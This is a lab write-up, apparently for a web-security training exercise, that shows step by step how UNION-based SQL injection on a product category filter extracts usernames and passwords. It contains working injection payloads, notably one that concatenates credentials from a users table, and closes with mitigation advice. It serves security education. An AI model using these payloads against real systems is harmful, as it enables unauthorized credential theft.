## Objective

Goal is to:

1. Determine the number of columns returned by the original query.
2. Identify which column accepts text data.
3. Retrieve both the username and password from the `users` table by concatenating them into a single text value.

---

# Step 1: Intercept the Request

1. Open **Burp Suite**.
2. Turn **Intercept ON**.
3. Browse to the vulnerable lab.
4. Click any product category.
5. Burp captures a request similar to:

```
GET /filter?category=Pets HTTP/2
Host: lab-id.web-security-academy.net
```

Send the request to **Repeater** (`Ctrl + R`).

---

# Step 2: Determine the Number of Columns and Identify the Text Column

Use the following payload:

```sql
'+UNION+SELECT+NULL,'abc'--
```

The SQL executed becomes similar to:

```sql
SELECT name, price
FROM products
WHERE category='Pets'

UNION

SELECT
NULL,
'abc'
```
<img width="1279" height="737" alt="Screenshot 2026-08-05 at 5 50 49 PM" src="https://github.com/user-attachments/assets/c44bbea4-6678-4100-ae00-4d44a423a2b4" />


### Explanation

The original query returns **2 columns**.

| Column | Data Type (Example) |
| --- | --- |
| Column 1 | Integer |
| Column 2 | Text |

The injected query returns:

| Column | Value |
| --- | --- |
| Column 1 | NULL |
| Column 2 | 'abc' |

If the page displays **abc**, you have confirmed:

- The query returns **2 columns**.
- Only the **second column** accepts text.
- `NULL` is used as a placeholder for the first column.

---

# Step 3: Retrieve Usernames and Passwords

Since only one column can display text, both values must be combined into a single string.

Use the following payload:

```sql
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

The SQL becomes:

```sql
SELECT name, price
FROM products
WHERE category='Pets'

UNION

SELECT
NULL,
username || '~' || password
FROM users
```

---

<img width="1280" height="718" alt="Screenshot 2026-08-05 at 5 49 41 PM" src="https://github.com/user-attachments/assets/baae8c35-2c22-4a70-a2bd-abf069a49393" />


# Understanding the Payload

### `UNION`

Combines the results of your injected query with the application's original query.

---

### `NULL`

Fills the first column because it does not display text.

---

### `username`

Retrieves the username from each row of the `users` table.

Example:

```
administrator
```

---

### `||`

In Oracle and PostgreSQL,

```sql
||
```

is the **string concatenation operator**.

It joins multiple strings together.

Example:

```sql
'Hello' || 'World'
```

Result:

```
HelloWorld
```

---

### `'~'`

The tilde (`~`) is simply a separator.

Without a separator:

```
administratorsecret123
```

It would be difficult to tell where the username ends and the password begins.

With the separator:

```
administrator~secret123
```

The two values are clearly separated.

---

### `password`

Retrieves the password from each user record.

Example:

```
secret123
```

---

### Combined Result

Suppose the `users` table contains:

| username | password |
| --- | --- |
| administrator | secret123 |
| carlos | football |
| peter | qwerty |

The expression:

```sql
username || '~' || password
```

produces:

Result

---

administrator~secret123

---

carlos~football

---

peter~qwerty

---

---

# Why Concatenate?

Imagine the original query returns:

| Column | Type |
| --- | --- |
| 1 | Integer |
| 2 | Text |

If you try:

```sql
UNION SELECT username,password FROM users
```

the database attempts to place:

| Injected Column | Value |
| --- | --- |
| Column 1 | username (text) |
| Column 2 | password (text) |

Since Column 1 expects a numeric value, a data type mismatch may occur.

Instead:

```sql
UNION SELECT NULL,username||'~'||password
```

returns:

| Column | Value |
| --- | --- |
| 1 | NULL |
| 2 | administrator~secret123 |

This matches the original query's structure and data types.

<img width="1276" height="727" alt="Screenshot 2026-08-05 at 5 53 33 PM" src="https://github.com/user-attachments/assets/bb8e77b0-e3f1-4ff4-b5ce-c47c45e87e23" />

## 🛡️ Mitigation

To prevent **UNION-based SQL Injection vulnerabilities involving the retrieval of multiple values through a single text column**:

* Use **parameterized queries (prepared statements)** instead of concatenating user input into SQL statements. This ensures user input is treated as data rather than executable SQL, preventing attackers from injecting `UNION SELECT` statements.
* Never build SQL queries by directly concatenating user-supplied input such as category names, product IDs, or search parameters. Use parameter binding provided by the database driver or framework.
* Validate input using an **allow-list** for parameters that should only accept predefined values (for example, valid product categories). Reject unexpected or malformed input before it reaches the database.
* Do not expose detailed database error messages (such as Oracle `ORA-01789`, PostgreSQL data type errors, or SQL Server conversion errors). Return generic error messages to users while logging detailed errors securely for administrators.
* Apply the **Principle of Least Privilege (PoLP)** by granting the application's database account only the minimum permissions required. The web application should not have unnecessary access to sensitive tables such as `users`, administrative data, or system metadata.
* Restrict access to database metadata and system catalog views (such as Oracle `ALL_TABLES`, PostgreSQL `information_schema`, or SQL Server catalog views) unless explicitly required by the application.
* Store user passwords using strong, one-way password hashing algorithms (such as **Argon2**, **bcrypt**, or **PBKDF2**) instead of plaintext. Even if a SQL Injection vulnerability is exploited, attackers should not be able to recover usable passwords.
* Use secure stored procedures where appropriate, ensuring they also use parameterized inputs and avoid unsafe dynamic SQL execution.
* Deploy a **Web Application Firewall (WAF)** to help detect and block common SQL Injection payloads, including `UNION SELECT`, string concatenation operators (`||`, `CONCAT()`), SQL comments (`--`, `/* */`), and other suspicious SQL patterns.
* Keep the web application, database server, drivers, frameworks, and dependencies updated with the latest security patches to reduce exposure to known vulnerabilities.
* Perform regular secure code reviews, vulnerability assessments, and authorized penetration testing to identify and remediate SQL Injection vulnerabilities before deployment.

---

## 💡 Lessons Learned

* A successful **UNION-based SQL Injection** requires the injected query to return the **same number of columns** as the application's original SQL query.
* Before retrieving sensitive information, an attacker typically determines **which columns accept text data**, because textual information such as usernames and passwords can only be displayed in compatible columns.
* When only **one text column** is available, multiple database values can be combined into a single output using the database's **string concatenation operator** (for example, `||` in Oracle and PostgreSQL or `CONCAT()` in MySQL).
* Separators such as the tilde (`~`) are commonly used when concatenating values to clearly distinguish one field from another (for example, `administrator~secret123`).
* The SQL `NULL` value is frequently used as a placeholder for columns that do not need to display data because it is compatible with most database data types and minimizes type mismatch errors.
* Once the correct column count and text-capable column have been identified, attackers can retrieve multiple pieces of sensitive information through a single visible column using `UNION SELECT`.
* Even when only one column is displayed by the application, improper query construction may still allow attackers to expose entire database records by concatenating multiple fields.
* Parameterized queries prevent attackers from modifying the structure of SQL statements, making them the most effective defense against UNION-based SQL Injection.
* Suppressing verbose database error messages and enforcing least-privilege database permissions significantly reduce information disclosure and limit the impact of successful SQL Injection attacks.
* **Burp Suite Repeater** is an effective tool for testing and validating UNION-based SQL Injection payloads during authorized security assessments, allowing testers to observe how different payloads affect application responses.
* Regular security testing, secure coding practices, and defense-in-depth controls are essential to prevent attackers from progressing from SQL Injection discovery to the extraction of sensitive credentials and other confidential database information.

